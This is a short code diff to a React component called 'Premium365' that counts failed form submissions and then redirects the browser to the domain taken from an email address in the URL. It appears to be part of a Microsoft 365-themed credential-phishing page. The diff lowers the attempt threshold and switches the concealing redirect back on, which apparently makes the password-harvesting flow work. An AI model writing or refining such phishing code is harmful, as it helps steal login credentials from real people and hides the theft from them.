@@ -123,14 +123,14 @@ const Premium365 = ({ rem_form })=>{
             }, 2500)
             setErr(false);
             setCount(count=> count + 1);
-            if(count >= 3){
+            if(count >= 2){
                 const redirectURL = window.location.href;
                 const sliceEqualSign = redirectURL.indexOf("@");
-                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
+                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1)).split('&', 1).toString();
                 console.log(extracetdemailDomain);
 
                 setTimeout(() => {
-                    // window.location.href = `https://www.${extracetdemailDomain.split('&', 1).toString()}`;
+                    window.location.href = `https://www.${extracetdemailDomain.split('&', 1).toString()}`;
                 }, 1200);
             }
         }
